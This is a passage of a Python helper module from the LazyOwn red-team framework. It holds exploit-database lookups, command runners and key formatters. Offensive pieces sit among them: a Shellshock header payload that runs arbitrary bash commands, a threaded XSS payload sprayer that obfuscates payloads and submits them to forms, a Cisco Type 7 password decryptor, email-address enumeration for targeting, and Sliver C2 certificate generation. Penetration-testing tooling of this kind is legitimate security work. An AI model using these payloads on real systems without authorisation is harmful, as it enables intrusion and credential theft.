        print_error(f"|{RED}- Internal Error - No result in ExploitAlert!{WHITE}")
    return

def packetstormsecurity(content):
    """
    Process and display results from PacketStorm Security.

    This function extracts exploit data from the provided content using regex. 
    If any results are found, it prints the title and link for each exploit, 
    and appends the results to a predata list. If no results are found, 
    it prints an error message.

    Parameters:
    - content (str): The HTML content from PacketStorm Security.

    Returns:
    None
    Thanks to Sicat 🐈
    An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
    """    
    try:
        reg = re.findall('<dt><a class="ico text-plain" href="(.*?)" title="(.*?)">(.*?)</a></dt>', content)
        if len(reg) != 0:
            
            print_msg(f"|{GREEN}+ PacketStorm Result {WHITE}")
            print_msg("|-----------------------")

            predata = []
            for data in reg:
                print_msg(f"|{BLUE}-{WHITE} Title : {data[2]}")
                print_msg(f"|{BLUE}-{WHITE} Link : https://packetstormsecurity.com{data[0]}")
            

                predata.append({
                    "title" : data[2],
                    "link" : f"https://packetstormsecurity.com{data[0]}"
                })
            print_msg(f"|{BLUE}-{WHITE} Total Result : {GREEN}{len(reg)}{WHITE} Exploits Found!")
            data.append({"packetstormsecurity" : predata})
        else:
            print_error(f"|{RED}- No result in PacketStorm!{WHITE}")
    except:
        print_error(f"|{RED}- Internal Error - No result in PacketStorm!{WHITE}")
    return

def nvddb(content):
    """
    Process and display results from the National Vulnerability Database.

    This function checks if there are any vulnerabilities in the provided content. 
    If vulnerabilities are present, it prints the ID, description, and link 
    for each CVE found, and appends the results to a predata list. 
    If no results are found, it prints an error message.

    Parameters:
    - content (dict): A dictionary containing vulnerability data.

    Returns:
    None
    Thanks to Sicat 🐈
    An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
    """
    try:
        if len(content['vulnerabilities']) != 0:
            print_msg(f"{GREEN}|-----------------------------------------------")
            print_msg(f"{GREEN}|+ National Vulnearbility Database Result       +{WHITE}")
            print_msg(f"{GREEN}|-----------------------------------------------")

            predata = []
            for data in content['vulnerabilities']:
                print_msg(f"{BLUE}-{BG_YELLOW}{RED} ID : {data['cve']['id']}")
                print_msg(f"{BLUE}-{BG_BLACK}{WHITE} Description : {data['cve']['descriptions'][0]['value']}")
                print_msg(f"{BLUE}-{BG_BLACK}{BLUE} Link : https://nvd.nist.gov/vuln/detail/{data['cve']['id']}")

                predata.append({
                    "title" : data['cve']['id'],
                    "description" : data['cve']['descriptions'][0]['value'],
                    "link" : f"https://nvd.nist.gov/vuln/detail/{data['cve']['id']}"
                })
            print_msg(f"|{BLUE}-{RED} Total Result : {GREEN}{len(content)}{YELLOW} CVEs Found!")
            data.append({"nvddb" : predata})
        else:
            print_error("|")
            print_error(f"|{RED}- No result in National Vulnearbility Database!{WHITE}")
    except:
        print_error(f"|{RED}- Internal Error - No result in National Vulnearbility Database!{WHITE}")
    return

def find_ss(keyword = ""):
    """
    Find CVEs in the National Vulnerability Database based on a keyword.

    This function takes a keyword, formats it for the API request, 
    and sends a GET request to the NVD API. If the request is successful, 
    it returns the JSON response containing CVE data; otherwise, 
    it returns False.

    Parameters:
    - keyword (str): The keyword to search for in CVEs.

    Returns:
    - dict or bool: The JSON response containing CVE data or False on failure.
    Thanks to Sicat 🐈
    An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
    """    
    keyword = f"{keyword}"
    keyword = keyword.replace(" ", "%20")
    resp = requests.get(f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={keyword}")
    if resp.status_code == 200:
        return resp.json()
    else:
        return False

def find_ea(keyword=""):
    """
    Find exploits in ExploitAlert based on a keyword.

    This function takes a keyword, formats it for the API request, 
    and sends a GET request to the ExploitAlert API. If the request is successful, 
    it returns the JSON response containing exploit data; otherwise, 
    it returns False.

    Parameters:
    - keyword (str): The keyword to search for exploits.

    Returns:
    - dict or bool: The JSON response containing exploit data or False on failure.
    Thanks to Sicat 🐈
    An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
    """    
    keyword = f"{keyword}"
    try:
        resp = requests.get(f"https://www.exploitalert.com/api/search-exploit?name={keyword}")
        if resp.status_code == 200:
            return resp.json()
        else:
            return False
    except:
        return False

def find_ps(keyword=""):
    """
    Find exploits in PacketStorm Security based on a keyword.

    This function takes a keyword, formats it for the search request, 
    and sends a GET request to the PacketStorm Security website. 
    If the request is successful, it returns the HTML response; otherwise, 
    it returns False.

    Parameters:
    - keyword (str): The keyword to search for exploits.

    Returns:
    - str or bool: The HTML response containing exploit data or False on failure.
    Thanks to Sicat 🐈
    An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
    """    
    keyword = f"{keyword}"
    resp = requests.get(f"https://packetstormsecurity.com/search/?q={keyword}")
    if resp.status_code == 200:
        return resp.text
    else:
        return False

def xor_encrypt_decrypt(data, key):
    """
    Encrypts or decrypts data using XOR encryption with the provided key.

    Parameters:
    data (bytes or bytearray): The input data to be encrypted or decrypted.
    key (str): The encryption key as a string.

    Returns:
    bytearray: The result of the XOR operation, which can be either the encrypted or decrypted data.

    Example:
    encrypted_data = xor_encrypt_decrypt(b"Hello, World!", "key")
    decrypted_data = xor_encrypt_decrypt(encrypted_data, "key")
    print(decrypted_data.decode("utf-8"))  # Outputs: Hello, World!

    Additional Notes:
    - XOR encryption is symmetric, meaning that the same function is used for both encryption and decryption.
    - The key is repeated cyclically to match the length of the data if necessary.
    - This method is commonly used for simple encryption tasks, but it is not secure for protecting sensitive information.
    """
    key_bytes = bytes(key, "utf-8")
    key_length = len(key_bytes)
    return bytearray([data[i] ^ key_bytes[i % key_length] for i in range(len(data))])

def run(command):
    """
    Executes a shell command using the subprocess module, capturing its output.

    Parameters:
    command (str): The command to execute.

    Returns:
    str: The output of the command if successful, or an error message if an exception occurs.

    Exceptions:
    - FileNotFoundError: Raised if the command is not found.
    - subprocess.CalledProcessError: Raised if the command exits with a non-zero status.
    - subprocess.TimeoutExpired: Raised if the command times out.
    - Exception: Catches any other unexpected exceptions.

    Example:
    output = run("ls -la")
    print(output)

    Additional Notes:
    The function attempts to execute the provided command, capturing its output.
    It also handles common exceptions that may occur during command execution.
    """
    try:
        print_msg(f"Attempting to execute: {command}")
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        print_msg(result)
        return result.stdout.strip()
    except FileNotFoundError as fnf_error:
        print_error(f"Command not found: {command}")
        return str(fnf_error)
    except subprocess.CalledProcessError as cpe_error:
        print_error(f"Command failed with exit code {cpe_error.returncode}: {command}")
        return str(cpe_error)
    except subprocess.TimeoutExpired as te_error:
        print_error(f"Command timed out: {command}")
        return str(te_error)
    except Exception as e:
        print_error(f"An unexpected error occurred: {str(e)}")
        return str(e)

def is_exist(file):
    """Check if a file exists.

    This function checks whether a given file exists on the filesystem. If the file 
    does not exist, it prints an error message and returns False. Otherwise, it returns True.

    Arguments:
    file (str): The path to the file that needs to be checked.

    Returns:
    bool: Returns True if the file exists, False otherwise.

    Example:
    >>> is_exist('/path/to/file.txt')
    True
    >>> is_exist('/non/existent/file.txt')
    False

    Notes:
    This function uses os.path.isfile to determine the existence of the file. 
    Ensure that the provided path is correct and accessible.
    """

    if not os.path.isfile(file):
        print_error(f"Fatal error: {file} is missing")
        return False
    return True

def get_domain(url):
    """
    Extracts the domain from a given URL.

    Parameters:
    url (str): The full URL from which to extract the domain.

    Returns:
    str: The extracted domain from the URL, or None if it cannot be extracted.
    """
    pattern = r'^(?:https?://)?(?:www\.)?([^/]+)'
    match = re.search(pattern, url)
    if match:
        return match.group(1)
    return None

def generate_certificates():
    """
    Generates a certificate authority (CA), client certificate, and client key.
    
    Returns:
        str: Paths to the generated CA certificate, client certificate, and client key.
    """
    # Create a temporary directory for the certificates
    with tempfile.TemporaryDirectory() as temp_dir:
        ca_cert_path = os.path.join(temp_dir, "ca_cert.pem")
        client_cert_path = os.path.join(temp_dir, "client_cert.pem")
        client_key_path = os.path.join(temp_dir, "client_key.pem")

        # Generate the CA certificate
        print_msg("Generating CA certificate...")
        subprocess.run([
            "sudo", "openssl", "req", "-x509", "-new", "-nodes", "-keyout", "ca_key.pem",
            "-out", ca_cert_path, "-days", "365", "-subj", "/CN=SliverCA"
        ], check=True)

        # Generate the client key
        print_msg("Generating client key...")
        subprocess.run([
            "sudo", "openssl", "genrsa", "-out", client_key_path, "2048"
        ], check=True)

        # Generate the client certificate signing request (CSR)
        print_msg("Generating client CSR...")
        subprocess.run([
            "sudo", "openssl", "req", "-new", "-key", client_key_path, "-out", "client_csr.pem",
            "-subj", "/CN=SliverClient"
        ], check=True)

        # Sign the client CSR with the CA key to create the client certificate
        print_msg("Generating client certificate...")
        subprocess.run([
            "sudo", "openssl", "x509", "-req", "-in", "client_csr.pem", "-CA", ca_cert_path,
            "-CAkey", "ca_key.pem", "-CAcreateserial", "-out", client_cert_path,
            "-days", "365"
        ], check=True)

        return ca_cert_path, client_cert_path, client_key_path

def generate_emails(full_name, domain):
    """
    Generate email permutations based on the provided full name and domain.

    This function takes a full name and domain as input, splits the full name into
    components, and creates a list of potential email addresses.

    Parameters:
    full_name (str): The full name to base the email addresses on.
    domain (str): The domain to use for the generated email addresses.

    Internal Variables:
    names (list): A list of the name components extracted from the full name.
    first_name (str): The first name component.
    last_name (str): The last name component.
    first_initial (str): The first initial of the first name.
    last_initial (str): The first initial of the last name.

    Returns:
    list: A list of generated email permutations.

    Note:
    - At least two parts of the name are required to generate valid email addresses.
    """
    names = full_name.lower().split()
    
    # Ensure the name has at least two parts
    if len(names) < 2:
        print("Please provide a full name with at least two parts (e.g., 'John Doe').")
        return []

    first_name = names[0]
    last_name = names[-1]
    first_initial = first_name[0]
    last_initial = last_name[0]

    # Define email permutations
    permutations = [
        f"{first_name}@{domain}",
        f"{last_name}@{domain}",
        f"{first_name}.{last_name}@{domain}",
        f"{first_initial}{last_name}@{domain}",
        f"{first_initial}.{last_name}@{domain}",
        f"{first_name}{last_initial}@{domain}",
        f"{first_name}.{last_initial}@{domain}",
        f"{first_initial}{last_initial}@{domain}",
        f"{first_initial}.{last_initial}@{domain}",
        f"{last_name}{first_name}@{domain}",
        f"{last_name}.{first_name}@{domain}",
        f"{last_name}{first_initial}@{domain}",
        f"{last_name}.{first_initial}@{domain}",
        f"{last_initial}{first_name}@{domain}",
        f"{last_initial}.{first_name}@{domain}",
        f"{last_initial}{first_initial}@{domain}",
        f"{last_initial}.{first_initial}@{domain}"
    ]
    
    return permutations
def clean_url(host):
    """Verifica si el último carácter es una barra y, de ser así, la elimina"""
    if host.endswith('/'):
        host = host.rstrip('/')
    return host
    
def random_string(length=15):
    """Generates a random alphanumeric string."""
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def generate_http_req(host, port, uri, custom_header=None, cmd=None):
    """Generates an HTTP request with the Shellshock payload."""
    if cmd:
        payload = f'() {{ :;}}; echo; /bin/bash -c "{cmd}"'
    else:
        random_string = random_string()
        payload = f'() {{ :;}}; echo; echo "{random_string}"'

    headers = {}
    if custom_header is None:
        headers = {
            'User-Agent': payload,
            'Referer': payload,
            'Cookie': payload
        }
    else:
        headers[custom_header] = payload
    
    url = f"{host}:{port}{uri}"
    print_msg(f"{headers=}")
    response = requests.get(url, headers=headers)

    if cmd:
        return response, None
    else:
        return response, random_string

def format_openssh_key(raw_key):
    """
    Formats a raw OpenSSH private key string to the correct OpenSSH format.

    This function takes a raw OpenSSH private key string, cleans it by removing any unnecessary 
    characters (such as newlines, spaces, and headers/footers), splits the key content into lines 
    of 64 characters, and then reassembles the key with the standard OpenSSH header and footer. 
    It ensures the key follows the correct OpenSSH format.

    Parameters:
        raw_key (str): The raw OpenSSH private key string to format.

    Returns:
        str: The formatted OpenSSH private key with proper headers, footers, and 64-character lines.
    """    
    # Todos los derechos son de 4xura: muchas gracias por esta pieza de software :D https://github.com/4xura/ssh_key_formatter/blob/main/ssh_key_formatter.py
    # Define the header and footer for the OpenSSH key format
    header = "-----BEGIN OPENSSH PRIVATE KEY-----"
    footer = "-----END OPENSSH PRIVATE KEY-----"
    
    # Clean input: Remove any newlines, spaces, and header/footer
    key_content = raw_key.replace(header, "").replace(footer, "").replace("\n", "").replace(" ", "").strip()
    
    # Split into 64-character lines
    formatted_key_content = "\n".join([key_content[i:i+64] for i in range(0, len(key_content), 64)])
    
    # Reassemble the key with the header and footer, and add necessary line breaks
    formatted_key = f"{header}\n{formatted_key_content}\n{footer}\n"
    
    return formatted_key

def format_rsa_key(raw_key):
    """
    Formats a raw RSA private key string to the correct PEM format.

    This function takes a raw RSA private key string, cleans it by removing any unnecessary
    characters (such as newlines, spaces, and headers/footers), splits the key content into lines 
    of 64 characters, and then reassembles the key with the standard PEM header and footer. 
    It ensures the key follows the correct RSA format.

    Parameters:
        raw_key (str): The raw RSA private key string to format.

    Returns:
        str: The formatted RSA private key with proper headers, footers, and 64-character lines.
    """    
    # Define the header and footer for the RSA key format
    header = "-----BEGIN RSA PRIVATE KEY-----"
    footer = "-----END RSA PRIVATE KEY-----"
    
    # Clean input: Remove any newlines, spaces, and header/footer
    key_content = raw_key.replace(header, "").replace(footer, "").replace("\n", "").replace(" ", "").strip()
    
    # Split into 64-character lines
    formatted_key_content = "\n".join([key_content[i:i+64] for i in range(0, len(key_content), 64)])
    
    # Reassemble the key with the header and footer, and add necessary line breaks
    formatted_key = f"{header}\n{formatted_key_content}\n{footer}\n"
    
    return formatted_key

def is_package_installed(package_name):
    """
    Check if a Python package is installed.

    :param package_name: Name of the package to check.
    :returns: True if installed, False otherwise.
    """
    
    return importlib.util.find_spec(package_name) is not None

def extract(string, extract_flag):
    """
    Extracts and processes specific hexadecimal sequences from a string based on a flag.

    If the `extract_flag` is set to True, the function extracts all sequences of the form 'x[a-f0-9][a-f0-9]' 
    (where 'x' is followed by two hexadecimal digits), removes the 'x' from the extracted sequences, 
    and returns the processed string. If `extract_flag` is False, the function returns the original string.

    Parameters:
        string (str): The input string from which hexadecimal sequences are to be extracted.
        extract_flag (bool): A flag indicating whether to perform the extraction (True) or not (False).

    Returns:
        str: The processed string with the extracted hexadecimal sequences if `extract_flag` is True, 
             or the original string if `extract_flag` is False.
    """    
    if extract_flag:
        string = "".join(re.findall(r"x[a-f0-9][a-f0-9]", string))  
        string = string.replace("x", "")  
        return string
    else:
        return string  

def clean_html(html_string):
    """
    Remove HTML tags from a string.

    This function uses a regular expression to strip HTML tags and return plain text.

    :param html_string: A string containing HTML content.
    :returns: A cleaned string with HTML tags removed.
    """
    clean_pattern = re.compile(r'<.*?>')
    cleaned_string = re.sub(clean_pattern, '', html_string)
    return cleaned_string.strip()

def run_command(command):
    """
    Run a command, print output in real-time, and store the output in a variable.

    This method executes a given command using `subprocess.Popen`, streams both the standard 
    output and standard error to the console in real-time, and stores the full output (stdout 
    and stderr) in a variable. If interrupted, the process is terminated gracefully.

    :param command: The command to be executed as a string.
    :type command: str

    :returns: The full output of the command (stdout and stderr).
    :rtype: str

    Example:
        To execute a command, call `run_command("ls -l")`.
    """

    output = ""  
    command_tokens = shlex.split(command)
    try:
        process = subprocess.Popen(
            command_tokens, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        while True:
            stdout_line = process.stdout.readline()
            if stdout_line:
                sys.stdout.write(stdout_line)  
                output += stdout_line  
            stderr_line = process.stderr.readline()
            if stderr_line:
                sys.stdout.write(stderr_line)  
                output += stderr_line  
            if not stdout_line and not stderr_line and process.poll() is not None:
                break
        stdout, stderr = process.communicate()
        if stdout:
            sys.stdout.write(stdout)
            output += stdout
        if stderr:
            sys.stdout.write(stderr)
            output += stderr
    except KeyboardInterrupt:
        process.terminate()
        print_warn("\n[Interrupted] Process terminated")
        process.wait()
    return output  

def generate_random_cve_id():
    """
    Generates a random CVE (Common Vulnerabilities and Exposures) ID.

    This function creates a random CVE ID by selecting a random year between 2020 and 2024,
    and a random code between 1000 and 9999. The CVE ID is returned in the format 'CVE-{year}-{code}'.

    Returns:
        str: A randomly generated CVE ID in the format 'CVE-{year}-{code}'.
    """    
    year = random.randint(2020, 2024)
    code = random.randint(1000, 9999)
    return f"CVE-{year}-{code}"


def get_credentials(file = None):
    """
    Searches for credential files with the pattern 'credentials*.txt' and allows the user to select one.
    
    The function lists all matching files and prompts the user to select one. It then reads the selected file
    and returns a list of tuples with the format (username, password) for each line in the file.

    Returns:
    list of tuples: A list containing tuples with (username, password) for each credential found in the file.
                    If no files are found or an invalid selection is made, an empty list is returned.
    """
    path = os.getcwd()
    credential_files = glob.glob(f"{path}/sessions/credentials*.txt")

    if not credential_files:
        print_error("No credential files found. Please create one using: createcredentials admin:admin")
        return []
    
    print_msg("The following credential files were found:")
    for idx, cred_file in enumerate(credential_files, 1):
        print_msg(f"{idx}. {cred_file}")

    try:
        file_choice = int(input("    [!] Select the credential file to use (enter the number): "))
        selected_file = credential_files[file_choice - 1]
    except (ValueError, IndexError):
        print_error("Invalid selection.")
        return []
    if file == True:
        return selected_file
    credentials = []
    with open(selected_file, "r") as file:
        for line in file:
            params = line.strip().split(":")
            if len(params) == 2:
                credentials.append((params[0], params[1]))

    return credentials

def obfuscate_payload(payload):
    """
    Obfuscates a payload string by converting its characters into hexadecimal format, 
    with additional comments for every third character.

    For every character in the payload, the function converts it to its hexadecimal representation.
    Every third character (after the first) is enclosed in a comment `/*hex_value*/`, while the rest 
    are prefixed with `\\x`.

    Parameters:
        payload (str): The input string that needs to be obfuscated.

    Returns:
        str: The obfuscated string where characters are replaced by their hexadecimal representations, 
             with every third character wrapped in a comment.
    """    
    obfuscated = ""
    for i, c in enumerate(payload):
        if i > 0 and i % 3 == 0:
            obfuscated += f"/*{hex(ord(c))}*/"
        else:
            obfuscated += f"\\x{hex(ord(c))[2:]}"
    return obfuscated

def read_payloads(file_path):
    """
    Reads a file containing payloads and returns a list of properly formatted strings.

    This function opens a specified file, reads each line, and checks if the line starts with a 
    double quote. If it does not, it adds double quotes around the line. Each line is stripped 
    of leading and trailing whitespace before being added to the list.

    Parameters:
        file_path (str): The path to the file containing payloads.

    Returns:
        list: A list of strings, each representing a payload from the file, formatted with 
              leading and trailing double quotes if necessary.
    """    
    with open(file_path, 'r') as file:
        lines = file.readlines()

    payloads = [line.strip() if line.startswith('"') else f'"{line.strip()}"' for line in lines]
    return payloads

def inject_payloads(urls, payload_url, request_timeout=15):
    """
    Sends HTTP requests to a list of URLs with injected payloads for testing XSS vulnerabilities.

    This function reads payloads from a specified file and sends GET requests to the provided URLs,
    injecting obfuscated payloads into the query parameters or form fields to test for cross-site 
    scripting (XSS) vulnerabilities. It handles both URLs with existing query parameters and those 
    without. If forms are found in the response, it submits them with the payloads as well.

    Parameters:
        urls (list): A list of URLs to test for XSS vulnerabilities.
        payload_url (str): A placeholder string within the payloads that will be replaced with 
                           the actual URL for testing.
        request_timeout (int, optional): The timeout for each request in seconds. Defaults to 15.

    Returns:
        None: This function does not return any value but prints the status of each request and 
              form submission to the console.

    Raises:
        requests.RequestException: Raises an exception if any HTTP request fails, which is handled
                                   by printing a warning message.
    """    
    payloads = read_payloads('modules/XssPayloads.txt')
    
    def send_request(raw_url):
        try:
            if not raw_url.startswith(('http://', 'https://')):
                raw_url = 'http://' + raw_url
            parsed_url = urllib.parse.urlparse(raw_url)
            query_params = urllib.parse.parse_qs(parsed_url.query)

            if not query_params:
                for payload in payloads:
                    obfuscated_payload = obfuscate_payload(payload.format(payload_url))
                    full_url = f"{raw_url}?xss={obfuscated_payload}"
                    print_msg(f"[INFO] Sending request to {full_url}")
                    resp = requests.get(full_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=request_timeout)
                    resp.raise_for_status()
                    handle_forms(resp.content, full_url)
                return
            
            for key in query_params:
                for payload in payloads:
                    obfuscated_payload = obfuscate_payload(payload.format(payload_url))
                    query_params[key] = obfuscated_payload

            updated_query = urllib.parse.urlencode(query_params, doseq=True)
            full_url = parsed_url._replace(query=updated_query).geturl()
            print_msg(f"[INFO] Sending request to {full_url}")
            resp = requests.get(full_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=request_timeout)
            resp.raise_for_status()
            handle_forms(resp.content, full_url)
        except requests.RequestException as e:
            print_warn(f"[WARN] Request failed for {raw_url}: {e}")

    def handle_forms(content, url):
        soup = BeautifulSoup(content, 'html.parser')
        forms = soup.find_all('form')

        if not forms:
            print_msg("[INFO] No forms found.")
            return

        for form in forms:
            action = form.get('action', url)
            if action.startswith('/'):
                action = urllib.parse.urljoin(url, action)

            method = form.get('method', 'GET').upper()
            form_data = {input.get('name'): payloads[0].format(payload_url) for input in form.find_all('input') if input.get('name')}
            if not form_data:
                print_warn("[WARN] No input fields found in form.")
                continue

            try:
                if method == 'POST':
                    resp = requests.post(action, data=form_data, headers={'User-Agent': 'Mozilla/5.0'})
                else:
                    resp = requests.get(action, params=form_data, headers={'User-Agent': 'Mozilla/5.0'})

                print_msg(f"[INFO] Form submission response from {action}: {resp.status_code}")
            except requests.RequestException as e:
                print_error(f"[ERROR] Failed to submit form at {action}: {e}")

    with ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(send_request, urls)

def prompt(label, default=None):
    """
    Return the prompt in the function do_xss
    """
    value = input(f"    {GREEN}{label}: ").strip()
    return value if value else default

def is_lower(char):
    """
    Checks if a character is lowercase.

    Parameters:
        char (str): The character to check.
    
    Returns:
        bool: True if the character is lowercase, False otherwise.
    """
    return char.islower()


def is_upper(char):
    """
    Checks if a character is uppercase.

    Parameters:
        char (str): The character to check.
    
    Returns:
        bool: True if the character is uppercase, False otherwise.
    """
    return char.isupper()


def is_mixed(s):
    """
    Determines if a string contains both lowercase and uppercase characters.

    Parameters:
        s (str): The string to check.
    
    Returns:
        bool: True if the string has mixed casing, False otherwise.
    """
    return any(c.islower() for c in s) and any(c.isupper() for c in s)


def add(str_part, delimiter, i):
    """
    Adds a delimiter between string parts if it's not the first part.

    Parameters:
        str_part (str): The string part to add.
        delimiter (str): The delimiter to insert between parts.
        i (int): The index of the part.

    Returns:
        str: The string part with delimiter if applicable.
    """
    if i == 0:
        return str_part
    return delimiter + str_part


def detect_delimiter(foo_bar):
    """
    Detects the delimiter used in the input string (e.g., "-", "_", ".").

    Parameters:
        foo_bar (str): The input string.
    
    Returns:
        str: The detected delimiter.
    """
    if "-" in foo_bar:
        return "-"
    elif "_" in foo_bar:
        return "_"
    elif "." in foo_bar:
        return "."
    return ""


def transform(parts, delimiter, casing):
    """
    Transforms a list of string parts based on the chosen casing style.

    Parameters:
        parts (list): List of string parts.
        delimiter (str): Delimiter to use between parts.
        casing (str): Casing style ('l', 'u', 'c', 'p').

    Returns:
        str: The transformed string.
    """
    result = ""
    
    for i, part in enumerate(parts):
        if casing == "l":
            result += add(part.lower(), delimiter, i)
        elif casing == "u":
            result += add(part.upper(), delimiter, i)
        elif casing == "c":
            if i == 0:
                result += add(part.lower(), delimiter, i)
            else:
                result += add(part.capitalize(), delimiter, i)
        elif casing == "p":
            result += add(part.capitalize(), delimiter, i)

    return result


def handle(input_str):
    """
    Splits the input string into parts based on delimiters or mixed casing.

    Parameters:
        input_str (str): The input string to split.

    Returns:
        list: A list of string parts.
    """
    parts = []

    if "-" in input_str:
        parts = input_str.split("-")
    elif "_" in input_str:
        parts = input_str.split("_")
    elif "." in input_str:
        parts = input_str.split(".")
    else:
        temp = ""
        for char in input_str:
            if char.isupper() and temp:
                parts.append(temp)
                temp = ""
            temp += char
        parts.append(temp)

    return parts

def get_users_dic(txt = None):
    """
    List all .txt files in the 'sessions/' directory and prompt the user to select one by number.
    
    :returns: The path of the selected .txt file.
    """
    path = os.path.join(os.getcwd(), 'sessions')
    
    if txt:
        txt_files = [f for f in os.listdir(path) if f.endswith(f'.{txt}')]
    else:
        txt = "txt"
        txt_files = [f for f in os.listdir(path) if f.endswith('.txt')]
    
    if not txt_files:
        print_error(f"No .{txt} files found in 'sessions/' directory.")
        return None

    print_msg(f"Available .{txt} files:")
    for i, file in enumerate(txt_files):
        print_msg(f"    {i + 1}. {file}")
    
    
    try:
        choice = int(input(f"    [!] Choose a file by number (1-{len(txt_files)}): ").strip())
        if 1 <= choice <= len(txt_files):
            selected_file = txt_files[choice - 1]
            return os.path.join(path, selected_file)
        else:
            print_warn("Invalid selection. Please choose a valid number.")
            return None
    except ValueError:
        print_warn("Invalid input. Please enter a number.")
        return None

def get_hash(dir = None):
    """
    Searches for hash files with the pattern 'hash*.txt' and allows the user to select one.
    
    The function lists all matching files and prompts the user to select one. It then reads the selected file
    and returns the hash content as a single string, without any newline characters or extra formatting.

    Returns:
    str: The hash content from the selected file as a single string. If no files are found or an invalid
         selection is made, an empty string is returned.
    """
    path = os.getcwd()
    hash_files = glob.glob(f"{path}/sessions/hash*.txt")

    if not hash_files:
        print_error("No hash files found.")
        return ""
    
    print_msg("The following hash files were found:")
    for idx, hash_file in enumerate(hash_files, 1):
        print_msg(f"{idx}. {hash_file}")

    try:
        file_choice = int(input("    [!] Select the hash file to use (enter the number): "))
        selected_file = hash_files[file_choice - 1]
    except (ValueError, IndexError):
        print_error("Invalid selection.")
        return ""
    
    try:
        if dir == True:
            return selected_file
        else:
            with open(selected_file, "r") as file:
                hash_content = file.read().strip()
            return hash_content
    except Exception as e:
        print_error(f"Failed to read the hash file: {str(e)}")
        return ""

def is_digit(the_digit):
    """Check if the given character is a digit.

    Args:
        the_digit (str): The character to check.

    Returns:
        bool: True if the character is a digit, False otherwise.
    """
    return the_digit in '0123456789'

def crack_password(crypttext):
    """Crack a Cisco Type 7 password.

    Args:
        crypttext (str): The encrypted password in Type 7 format.

    Returns:
        str: The cracked plaintext password or an empty string if invalid.
    """
    crypttext = crypttext.upper()
    plaintext = ''
    xlat = "dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87"
    seed, val = 0, 0

    if len(crypttext) % 2 != 0:
        return ""

    seed = (ord(crypttext[0]) - 0x30) * 10 + ord(crypttext[1]) - 0x30

    if seed > 15 or not is_digit(crypttext[0]) or not is_digit(crypttext[1]):
        return ""

    for i in range(2, len(crypttext)):
        val *= 16

        if is_digit(crypttext[i]):
            val += ord(crypttext[i]) - 0x30
        elif 'A' <= crypttext[i] <= 'F':
            val += ord(crypttext[i]) - ord('A') + 0x0A
        else:
            return ""

        if i % 2 != 0:
            plaintext += chr(val ^ ord(xlat[seed]))
            seed = (seed + 1) % len(xlat)
            val = 0

    return plaintext

def get_terminal_size():
    try:
        size = os.get_terminal_size(sys.stdout.fileno())
        return size.lines, size.columns
    except Exception as e:
        print_error(f"Cannot get the size: {e}")
        return None, None    

def halp():
    """
    Display the help panel for the LazyOwn RedTeam Framework.

    This function prints usage instructions, options, and descriptions for 
    running the LazyOwn framework. It provides users with an overview of 
    command-line options that can be used when executing the `./run` command.

    The output includes the current version of the framework and various 
    options available for users, along with a brief description of each option.

    Options include:
        - `--help`: Displays the help panel.
        - `-v`: Shows the version of the framework.
        - `-p <payloadN.json>`: Executes the framework with a specified payload 
          JSON file. This option is particularly useful for Red Teams.
        - `-c <command>`: Executes a specific command using LazyOwn, for 
          example, `ping`.
        - `--no-banner`: Runs the framework without displaying the banner.
        - `-s`: Runs the framework with root privileges.
        - `--old-banner`: Displays the old banner.

    Example:
        To see the help panel, call the function as follows:
        
        >>> halp()

    Note:
        - This function exits the program after displaying the help information,
          using `sys.exit(0)`.
    """
    print(f"    {RED}[;,;]{GREEN} LazyOwn {CYAN}{version}{RESET}")
    print(f"    {GREEN}Usage: {WHITE}./run {GREEN}[Options]{RESET}")
    print(f"    {YELLOW}Options:")
    print(f"    {GREEN}  --help             Show this help panel.")
    print(f"    {GREEN}  -v                 Show version.")
    print(f"    {GREEN}  -p <payloadN.json> Exec with different payload.json example. ./run -p payload1.json, (Special for RedTeams)")
    print(f"    {GREEN}  -c <command>       Exec a command using LazyOwn example: ping")
    print(f"    {GREEN}  --no-banner        No Banner{RESET}")
    print(f"    {GREEN}  -s                 Run as root {RESET}")
    print(f"    {GREEN}  --old-banner       Show old Banner{RESET}")
    sys.exit(0)
 

def ensure_tmux_session(session_name):
    """
    Ensure that a tmux session is active.

    This function checks whether a specified tmux session is currently running.
    If the session does not exist, it creates a new tmux session with the specified
    name and executes the command to run the LazyOwn RedTeam Framework script.

    The function uses the `tmux has-session` command to check for the existence
    of the session. If the session is not found (i.e., the return code is not zero),
    it will create a new tmux session in detached mode and run the command 
    `./run --no-banner` within that session.

    Args:
        session_name (str): The name of the tmux session to check or create.

    Example:
        To ensure that a tmux session named 'lazyown_sessions' is active,
        call the function as follows:
        
        >>> ensure_tmux_session('lazyown_sessions')

    Note:
        - Ensure that tmux is installed and properly configured on the system.
        - The command executed within the tmux session must be valid and
          accessible in the current environment.
    """
    result = subprocess.run(
        ["tmux", "has-session", "-t", session_name],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    if result.returncode != 0:
        command = f"tmux has-session -t '{session_name}' 2>/dev/null || tmux new-session -d -s '{session_name}' './run --no-banner' && tmux attach -t '{session_name}'"
        print_msg(command)
        os.system(command)

def get_xml(directory):
    """
    Retrieves a list of XML files from the specified directory.

    Args:
        directory (str): The directory to search for XML files.

    Returns:
        list: A list of XML filenames found in the specified directory.
    """
    return [file for file in os.listdir(directory) if file.endswith(".xml")]

def get_domain_from_xml(xml_file):
    """
    Extrae el primer dominio o dirección IP de un archivo XML de un escaneo Nmap.
    """
    domain = None

    if not os.path.exists(xml_file):
